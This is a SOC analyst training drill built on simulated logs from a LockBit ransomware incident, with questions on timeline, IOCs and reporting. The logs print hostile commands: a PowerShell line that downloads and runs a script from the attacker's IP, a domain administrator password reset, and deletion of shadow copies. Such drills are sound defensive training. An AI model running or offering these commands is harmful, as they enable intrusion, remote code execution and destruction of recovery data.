# Drill 02 (Intermediate): Ransomware Log Analysis

**Estimated time:** 50 minutes

**Difficulty:** Intermediate

**Tools:** Text editor + Splunk (optional)

## Objective

Analyze a set of log excerpts from a simulated ransomware incident.
Reconstruct the attack timeline, identify the initial access vector, and document the findings in an incident report format.

## Background

You are a Tier 2 SOC analyst.
A user called the help desk at 09:15 on March 15, 2024, reporting that their files have strange extensions and there's a README file asking for bitcoin.
Your Tier 1 colleague has pulled the relevant logs from the SIEM and handed them to you.

---

## Log Data

### Log Set 1: VPN Access Logs (03:00 – 09:00 UTC)

```text
2024-03-15T03:12:44Z CORP-VPN vpn_access user=mjones action=connect src_ip=185.220.101.77 country=RO duration=0
2024-03-15T03:12:44Z CORP-VPN vpn_access user=mjones action=auth_success src_ip=185.220.101.77
2024-03-15T03:13:01Z CORP-VPN vpn_access user=mjones action=ip_assigned vpn_ip=10.8.0.50
2024-03-14T21:45:19Z CORP-VPN vpn_access user=mjones action=connect src_ip=76.12.44.33 country=US duration=28800 action=disconnect
```

### Log Set 2: Authentication Logs (03:00 – 06:00 UTC)

```text
2024-03-15T03:13:22Z DC01 EventID=4624 Account_Name=mjones Logon_Type=3 IpAddress=10.8.0.50 WorkstationName=LAPTOP-MJONES
2024-03-15T03:13:45Z DC01 EventID=4624 Account_Name=mjones Logon_Type=3 IpAddress=10.8.0.50 WorkstationName=SERVER-FS01
2024-03-15T03:14:02Z DC01 EventID=4624 Account_Name=mjones Logon_Type=3 IpAddress=10.8.0.50 WorkstationName=SERVER-BACKUP01
2024-03-15T03:14:15Z DC01 EventID=4624 Account_Name=mjones Logon_Type=3 IpAddress=10.8.0.50 WorkstationName=SERVER-SQL01
2024-03-15T03:14:29Z DC01 EventID=4624 Account_Name=mjones Logon_Type=3 IpAddress=10.8.0.50 WorkstationName=SERVER-DC01
2024-03-15T03:14:55Z DC01 EventID=4648 Account_Name=mjones TargetServerName=DC01 TargetAccountName=Administrator IpAddress=10.8.0.50
2024-03-15T03:15:10Z DC01 EventID=4624 Account_Name=Administrator Logon_Type=3 IpAddress=10.8.0.50 WorkstationName=DC01
```

### Log Set 3: Endpoint (Sysmon) Logs — SERVER-DC01 (03:15 – 05:00 UTC)

```text
2024-03-15T03:15:25Z SERVER-DC01 EventID=1 User=CORP\Administrator Image=C:\Windows\System32\cmd.exe ParentImage=C:\Windows\System32\services.exe CommandLine="cmd.exe /c net user Administrator Passw0rd123! /domain"
2024-03-15T03:16:02Z SERVER-DC01 EventID=1 User=CORP\Administrator Image=C:\Windows\System32\net.exe ParentImage=C:\Windows\System32\cmd.exe CommandLine="net localgroup administrators /domain"
2024-03-15T03:20:14Z SERVER-DC01 EventID=1 User=CORP\Administrator Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentImage=C:\Windows\System32\cmd.exe CommandLine="powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.77/payload.ps1')\""
2024-03-15T03:20:31Z SERVER-DC01 EventID=3 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe DestinationIp=185.220.101.77 DestinationPort=80
2024-03-15T03:21:05Z SERVER-DC01 EventID=11 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename=C:\Windows\Temp\LockBit3.exe
2024-03-15T04:58:22Z SERVER-DC01 EventID=1 User=CORP\Administrator Image=C:\Windows\Temp\LockBit3.exe ParentImage=C:\Windows\System32\cmd.exe CommandLine="C:\Windows\Temp\LockBit3.exe -pass [HASH_REDACTED]"
```

### Log Set 4: File System Activity — File Server (04:58 – 09:15 UTC)

```text
2024-03-15T04:58:30Z SERVER-FS01 file_activity event=mass_rename src=CORP\Administrator count=15234 ext_before=various ext_after=.lockbit3 duration_seconds=487
2024-03-15T05:07:15Z SERVER-FS01 file_activity event=file_create filename=README-LockBit.txt locations=everywhere count=847
2024-03-15T05:07:18Z SERVER-FS01 file_activity event=vss_delete user=CORP\Administrator command="vssadmin delete shadows /all /quiet" success=true
```

### Log Set 5: Network Logs — Egress Firewall (03:20 – 04:55 UTC)

```text
2024-03-15T03:20:31Z FW-EDGE action=allow src=10.0.1.20 dst=185.220.101.77 dpt=80 proto=TCP bytes=512
2024-03-15T03:20:33Z FW-EDGE action=allow src=10.0.1.20 dst=185.220.101.77 dpt=80 proto=TCP bytes=2097152
2024-03-15T04:45:12Z FW-EDGE action=allow src=10.0.1.20 dst=185.220.101.77 dpt=443 proto=TCP bytes=5368709120
2024-03-15T04:55:01Z FW-EDGE action=allow src=10.0.1.20 dst=185.220.101.77 dpt=443 proto=TCP bytes=0
```

---

## Questions

### Part A: Timeline Reconstruction (20 min)

1. What was the **initial access vector** used by the attacker?
1. What **time** did the attacker first authenticate to the VPN?
1. Is the VPN connection unusual? What evidence supports this?
1. How did the attacker escalate from user `mjones` to `Administrator`?
1. How many servers did the attacker access via lateral movement?

### Part B: Ransomware Analysis (15 min)

1. What ransomware family was deployed? How do you know?
1. Where was the ransomware binary downloaded from?
1. What is the name of the dropped ransom note?
1. How did the attacker **prevent recovery** (anti-forensics)? What command?
1. How many files were encrypted? How long did encryption take?
1. Approximately how much data was exfiltrated before encryption (Log Set 5, entry at 04:45:12)?

### Part C: IOC Extraction (10 min)

Extract all IOCs from the log data.
For each, specify type, value, and context:

| IOC Type | Value | Context |
|---------- |-------|---------|
| ? | ? | ? |
| ... | ... | ... |

### Part D: Incident Report (5 min)

Write a 5-sentence executive summary of this incident for a non-technical manager.

---

See `../solutions/drill-02-solution/README.md` for the complete answer.
